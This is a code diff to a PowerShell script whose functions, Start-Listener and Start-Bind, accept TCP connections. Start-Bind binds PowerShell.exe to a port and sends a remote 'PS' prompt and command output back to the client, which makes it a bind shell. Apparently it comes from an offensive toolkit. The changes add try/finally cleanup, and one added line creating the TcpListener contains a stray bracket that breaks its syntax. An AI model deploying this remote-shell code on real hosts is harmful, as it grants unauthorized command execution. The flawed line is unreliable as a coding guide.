@@ -87,23 +87,43 @@ Function Start-Listener {
     If ($PSCmdlet.ShouldProcess($Socket.Start()))
     {
 
-        Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
-        While ($True)
+        Try 
         {
 
-            Write-Verbose "Waiting for connection..."
-            If ($Socket.Pending())
+            Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
+            While ($True)
             {
 
-                $Client = $Socket.AcceptTcpClient()
+                Write-Verbose "Waiting for connection..."
+                If ($Socket.Pending())
+                {
 
-                Break;
+                    $Client = $Socket.AcceptTcpClient()
+
+                    Break;
+
+                }  # End If
+
+                Start-Sleep -Seconds 2
+
+            }  # End While
+        
+        }  # End Try
+        Finally 
+        {
+
+            If (!($Client.Connected))
+            {
+
+                Write-Verbose "Terminating connection"
+                $Socket.Stop()
+                $Client.Close()
+                $Stream.Dispose()
+                Write-Verbose "Connection closed"
 
             }  # End If
 
-            Start-Sleep -Seconds 2
-
-         }  # End While
+        }  # End Finally
 
         Write-Output "[*] Connection Established"
 
@@ -235,30 +255,43 @@ Function Start-Bind {
         }  # End If
 
         Write-Verbose "Creating listener on port $PortString"
-        $Listener = [System.Net.Sockets.TcpListener]$Port
+        $Listener = New-Object -TypeName System.Net.Sockets.TcpListener]('0.0.0.0', $Port)
 
         If ($PSCmdlet.ShouldProcess($Listener.Start()))
         {
 
             Write-Output "[*] PowerShell.exe is bound to port $PortString"
 
-
-            While ($True)
+            Try 
             {
 
-                Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
-                If ($Listener.Pending())
+                While ($True)
                 {
 
-                    $Client = $Listener.AcceptTcpClient()
+                    Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
+                    If ($Listener.Pending())
+                    {
 
-                    Break;
+                        $Client = $Listener.AcceptTcpClient()
 
-                }  # End If
+                        Break;
 
-                Start-Sleep -Seconds 1
+                    }  # End If
 
-             }  # End While
+                    Start-Sleep -Seconds 2
+
+                }  # End While
+            
+            }  # End Try
+            Finally 
+            {
+
+                Write-Output "[*] Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
+                
+                $Client.Close()
+                $Listener.Stop()
+
+            }  # End Finally
 
             Write-Output "[*] Connection Established"
             $Stream = $Client.GetStream()
@@ -296,7 +329,7 @@ Function Start-Bind {
                 Write-Verbose "Initial data send failed. Attempting a second time"
                 $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
                 $x = ($Error[0] | Out-String)
-                $Error.clear()
+                $Error.Clear()
                 $SendBack2 = $SendBack2 + $x
 
                 $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
